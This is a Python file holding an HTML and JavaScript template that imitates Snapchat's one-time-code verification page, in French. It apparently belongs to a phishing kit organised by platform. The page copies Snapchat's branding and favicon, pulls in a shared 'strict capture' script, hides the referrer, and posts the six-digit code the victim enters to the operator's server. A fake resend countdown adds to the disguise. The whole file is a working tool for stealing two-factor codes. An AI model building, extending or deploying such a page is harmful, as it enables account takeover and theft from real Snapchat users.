"""otp.py - Template OTP Snapchat."""

from platforms._shared import JS_STRICT_CAPTURE, SC_LOGO_SVG as _SC_LOGO_SVG

HTML_OTP_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#fffc00">
    <link rel="shortcut icon" href="https://accounts.snapchat.com/favicon.ico" type="image/x-icon">
    <title>Vérification | Snapchat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #fffc00;
            font-family: "Avenir Next", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #000;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }
        .safe-top { height: env(safe-area-inset-top, 0px); }
        .safe-bottom { height: env(safe-area-inset-bottom, 0px); }

        .sc-top { display: flex; align-items: center; justify-content: center; padding: clamp(12px, 3vmin, 20px) 16px clamp(8px, 2vmin, 14px); }
        .sc-top-logo { height: clamp(36px, 9vmin, 56px); width: auto; }

        .sc-card {
            background: #ffffff;
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            padding: clamp(24px, 5vmin, 36px) clamp(20px, 4vmin, 28px);
            border-radius: clamp(16px, 4vmin, 24px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06);
            box-sizing: border-box;
        }
        .sc-title {
            font-size: clamp(20px, 5vmin, 26px);
            font-weight: 800;
            margin: 0 0 clamp(4px, 1vmin, 8px);
            color: #000;
            text-align: center;
        }
        .sc-subtitle {
            font-size: clamp(13px, 3.2vmin, 15px);
            color: #757575;
            margin-bottom: clamp(20px, 5vmin, 28px);
            font-weight: 500;
            text-align: center;
        }

        .otp-container {
            display: flex;
            gap: clamp(6px, 2vmin, 10px);
            justify-content: center;
            margin-bottom: clamp(20px, 5vmin, 28px);
        }
        .otp-box {
            width: clamp(40px, 11vmin, 52px);
            height: clamp(50px, 13vmin, 60px);
            border: 2px solid #e0e0e0;
            border-radius: clamp(10px, 2.5vmin, 14px);
            text-align: center;
            font-size: clamp(20px, 5vmin, 26px);
            font-weight: 700;
            color: #000;
            background: #fafafa;
            outline: none;
            transition: all 0.18s ease;
            font-family: inherit;
            -webkit-appearance: none;
        }
        .otp-box:focus {
            border-color: #000;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(255,252,0,0.3);
        }
        .otp-box.filled {
            border-color: #000;
            background: #fffbeb;
        }

        .sc-btn {
            background: #fffc00;
            color: #000;
            border: 2px solid #000;
            border-radius: 999px;
            padding: clamp(14px, 3.5vmin, 18px);
            font-weight: 700;
            width: 100%;
            font-size: clamp(15px, 3.7vmin, 18px);
            cursor: pointer;
            transition: all 0.18s ease;
            box-shadow: 0 4px 0 #000;
        }
        .sc-btn:active { transform: translateY(2px); box-shadow: 0 2px 0 #000; }
        .sc-btn:disabled { background: #f0f0f0; color: #999; border-color: #ccc; box-shadow: 0 4px 0 #ccc; cursor: not-allowed; }

        .sc-timer {
            text-align: center;
            font-size: clamp(13px, 3vmin, 15px);
            color: #757575;
            font-weight: 600;
            margin-top: clamp(12px, 3vmin, 16px);
        }
        .sc-resend {
            text-align: center;
            margin-top: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(13px, 3vmin, 15px);
        }
        .sc-resend a {
            color: #000;
            font-weight: 700;
            text-decoration: underline;
            cursor: pointer;
        }

        .sc-error {
            background: #fff0f0;
            border: 2px solid #ff004f;
            color: #ff004f;
            border-radius: clamp(10px, 2.5vmin, 14px);
            padding: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(12px, 3vmin, 14px);
            margin-bottom: clamp(12px, 3vmin, 16px);
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>
    <div class="sc-top">
        """ + _SC_LOGO_SVG + r"""
    </div>

    <div class="flex-1 flex items-center justify-center" style="padding: 0 16px; min-height: calc(100vh - 100px);">
        <div class="sc-card">
            <h2 class="sc-title">{{ otp_title }}</h2>
            <p class="sc-subtitle">{{ otp_sub }}</p>

            <div id="error-box" class="{% if not message %}hidden{% endif %} sc-error">{{ message }}</div>

            <form method="POST" id="otp-form">
                <input type="hidden" name="action" value="code">
                <input type="hidden" name="code" id="otp-hidden">
                <div class="otp-container">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" autofocus>
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                </div>
                <button type="submit" class="sc-btn" id="otp-submit" disabled>{{ otp_submit }}</button>
            </form>

            <div class="sc-timer" id="timer">Renvoyer le code dans 01:00</div>
            <div class="sc-resend hidden" id="resend">
                <a id="resend-link">Renvoyer le code</a>
            </div>
        </div>
    </div>

    <div class="safe-bottom"></div>

    <script>
    (function() {
        var boxes = document.querySelectorAll('.otp-box');
        var hidden = document.getElementById('otp-hidden');
        var submit = document.getElementById('otp-submit');
        var timerEl = document.getElementById('timer');
        var resendEl = document.getElementById('resend');
        var seconds = 60;

        function updateHiddenAndSubmit() {
            var code = '';
            boxes.forEach(function(b) { code += b.value; });
            hidden.value = code;
            submit.disabled = code.length !== 6;
            boxes.forEach(function(b) {
                if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
            });
        }

        boxes.forEach(function(box, idx) {
            box.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value && idx < boxes.length - 1) boxes[idx + 1].focus();
                updateHiddenAndSubmit();
            });
            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && idx > 0) {
                    boxes[idx - 1].focus();
                    boxes[idx - 1].value = '';
                    updateHiddenAndSubmit();
                }
                if (e.key === 'ArrowLeft' && idx > 0) boxes[idx - 1].focus();
                if (e.key === 'ArrowRight' && idx < boxes.length - 1) boxes[idx + 1].focus();
            });
            box.addEventListener('paste', function(e) {
                e.preventDefault();
                var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
                for (var i = 0; i < pasted.length && idx + i < boxes.length; i++) boxes[idx + i].value = pasted[i];
                if (idx + pasted.length < boxes.length) boxes[idx + pasted.length].focus();
                else boxes[boxes.length - 1].focus();
                updateHiddenAndSubmit();
            });
        });

        updateHiddenAndSubmit();

        var interval = setInterval(function() {
            seconds--;
            var m = Math.floor(seconds / 60), s = seconds % 60;
            timerEl.textContent = 'Renvoyer le code dans ' + (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
            if (seconds <= 0) {
                clearInterval(interval);
                timerEl.classList.add('hidden');
                resendEl.classList.remove('hidden');
            }
        }, 1000);
    })();
    </script>
</body>
</html>
"""
